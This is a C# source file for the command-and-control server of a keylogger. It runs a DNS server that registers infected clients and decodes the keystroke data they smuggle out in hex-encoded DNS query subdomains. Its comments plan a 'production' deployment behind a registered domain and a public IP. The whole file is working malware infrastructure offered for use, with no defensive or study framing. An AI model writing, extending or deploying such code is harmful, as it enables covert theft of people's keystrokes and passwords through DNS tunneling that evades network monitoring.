using System.Net;
using System.Net.Sockets;
using Server.Models;
using Server.DNS;
using Server.Utilities;

namespace Server.Logic
{
    /// <summary>
    /// Authoritative DNS Server - C&C Server for keylogger
    /// 
    /// DEPLOYMENT MODES:
    /// 
    /// 1. LOCAL TEST MODE (Current):
    ///    Client → Directly to this server (127.0.0.1:53)
    ///    No DNS Resolver needed
    /// 
    /// 2. PRODUCTION MODE (Future - with DNS Resolver):
    ///    Client → DNS Resolver → This server (Authoritative)
    ///    Requires:
    ///    - DNS Resolver (BIND/Unbound/Custom)
    ///    - Domain registration with NS records pointing here
    ///    - Public IP and proper firewall config
    /// </summary>
    public class ServerLogic
    {
        private UdpClient? _udpServer;
        private bool _isRunning;
        private string _domain = "example.com";
        private string _serverIp = "127.0.0.1";

        // Modular components
        private ClientManager? _clientManager;
        private ProtocolHandler? _protocolHandler;
        private AuthoritativeDNSHandler? _dnsHandler;

        // Events for UI updates
        public event Action<string>? OnLogMessage;
        public event Action<ClientInfo>? OnClientAdded;
        public event Action<int>? OnClientRemoved;
        public event Action<int>? OnClientCountChanged;
        public event Action<int, string>? OnDataReceived;


        /// LOCAL TEST: port=53, domain=example.com, serverIp=127.0.0.1
        /// PRODUCTION: port=53, domain=yourdomain.com, serverIp=PUBLIC_IP
        public void Start(int port, string domain, string logPath, string serverIp = "127.0.0.1")
        {
            if (_isRunning) return;

            _domain = domain.ToLower();
            _serverIp = serverIp;
            
            _clientManager = new ClientManager(logPath);
            _protocolHandler = new ProtocolHandler(_domain);
            _dnsHandler = new AuthoritativeDNSHandler(_domain, _serverIp);

            // Wire up events
            _clientManager.OnClientAdded += (info) => OnClientAdded?.Invoke(info);
            _clientManager.OnClientCountChanged += (count) => OnClientCountChanged?.Invoke(count);
            _protocolHandler.OnDataReceived += (id, data) =>
            {
                LogMessage("  => Decoded: '" + data + "'");
                OnDataReceived?.Invoke(id, data);
            };

            try
            {
                _udpServer = new UdpClient(port);
                _isRunning = true;

                LogMessage($"[Started] Authoritative DNS Server listening on port {port}");
                LogMessage($"[Domain] {_domain}");
                LogMessage($"[Server IP] {_serverIp}");
                LogMessage($"[Logs] {Path.GetFullPath(logPath)}");
                LogMessage("[MODE] LOCAL TEST - Direct client connections");
                LogMessage("  => Client connects directly to this server");
                LogMessage("  => No DNS Resolver needed");

                Task.Run(() => ListenForQueries());
            }
            catch (Exception ex)
            {
                LogMessage($"[Error] Failed to start: {ex.Message}");
            }
        }

        public void Stop()
        {
            if (!_isRunning) return;

            _isRunning = false;
            _udpServer?.Close();
            
            if (_clientManager != null)
            {
                _clientManager.SaveAllLogs(LogMessage);
            }
            
            LogMessage("[Stopped] Server stopped");
        }

        private async void ListenForQueries()
        {
            while (_isRunning && _udpServer != null)
            {
                try
                {
                    var result = await _udpServer.ReceiveAsync();
                    _ = Task.Run(() => ProcessQuery(result.Buffer, result.RemoteEndPoint));
                }
                catch (Exception ex)
                {
                    if (_isRunning)
                        LogMessage($"[Error] {ex.Message}");
                }
            }
        }

        private void ProcessQuery(byte[] data, IPEndPoint remoteEP)
        {
            if (_clientManager == null || _protocolHandler == null || _dnsHandler == null)
                return;

            try
            {
                var dnsQuery = DNSParser.ParseQuery(data);
                var queryName = dnsQuery.QueryName.ToLower();

                byte[] response;

                try
                {
                    // Only process A record queries
                    if (dnsQuery.QueryType != 1)
                    {
                        throw new UnrelatedException();
                    }

                    // Extract data from query (a.1.1.1 or b.0.5.hexdata)
                    string extractedData = _protocolHandler.GetData(queryName);
                    string[] parts = extractedData.Split('.', 2);
                    string packetType = parts[0];

                    if (packetType == "a")
                    {
                        // Connection request
                        LogMessage($"\n[Query] {queryName} from {remoteEP.Address}");
                        LogMessage($"[Connect] Starting connection #{_clientManager.ClientCount + 1}");

                        int connectionId = _clientManager.AddClient(remoteEP.Address.ToString());
                        string fakeIp = IPGenerator.CreateStartIp(connectionId - 1);

                        response = DNSResponseBuilder.CreateSimpleAResponse(data, dnsQuery, fakeIp);
                    }
                    else if (packetType == "b")
                    {
                        // Data packet
                        LogMessage($"\n[Query] {queryName} from {remoteEP.Address}");
                        string rest = parts.Length > 1 ? parts[1] : "";
                        
                        var metadata = _protocolHandler.ParseDataPacket(rest, _clientManager);
                        LogMessage($"[Data] Parsing from connection #{metadata.ConnectionId}");

                        string responseIp = IPGenerator.CreateResponseIp(ResponseCode.OK);
                        response = DNSResponseBuilder.CreateSimpleAResponse(data, dnsQuery, responseIp);
                    }
                    else
                    {
                        throw new UnrelatedException();
                    }
                }
                catch (ShortCircuitException)
                {
                    LogMessage("  └─> Short circuit: duplicate packet");
                    response = DNSResponseBuilder.CreateEmptyResponse(data, dnsQuery);
                }
                catch (UnrelatedException)
                {
                    // Handle normal DNS queries (for production mode)
                    LogMessage($"[Normal DNS Query] {queryName}");
                    response = _dnsHandler.HandleQuery(data, dnsQuery, queryName);
                }
                catch (DNSSyntaxException)
                {
                    LogMessage($"[Error] Improper syntax from {remoteEP.Address}");
                    string responseIp = IPGenerator.CreateResponseIp(ResponseCode.MALFORMED);
                    response = DNSResponseBuilder.CreateSimpleAResponse(data, dnsQuery, responseIp);
                }
                catch (ServerMaxConnectionsException)
                {
                    LogMessage($"[Error] Max connections reached from {remoteEP.Address}");
                    string responseIp = IPGenerator.CreateResponseIp(ResponseCode.MAX);
                    response = DNSResponseBuilder.CreateSimpleAResponse(data, dnsQuery, responseIp);
                }
                catch (NXConnectionException)
                {
                    LogMessage($"[Error] Connection does not exist from {remoteEP.Address}");
                    string responseIp = IPGenerator.CreateResponseIp(ResponseCode.NX);
                    response = DNSResponseBuilder.CreateSimpleAResponse(data, dnsQuery, responseIp);
                }
                catch (PacketsOutOfOrderException)
                {
                    LogMessage($"[Error] Out of order packets from {remoteEP.Address}");
                    string responseIp = IPGenerator.CreateResponseIp(ResponseCode.OOO);
                    response = DNSResponseBuilder.CreateSimpleAResponse(data, dnsQuery, responseIp);
                }
                catch (Exception ex)
                {
                    LogMessage($"[Exception] {ex.Message} from {remoteEP.Address}");
                    response = DNSResponseBuilder.CreateEmptyResponse(data, dnsQuery);
                }

                _udpServer?.Send(response, response.Length, remoteEP);
            }
            catch (Exception ex)
            {
                LogMessage($"[Error] Processing query: {ex.Message}");
            }
        }

        private void LogMessage(string message)
        {
            OnLogMessage?.Invoke(message);
        }
    }
}
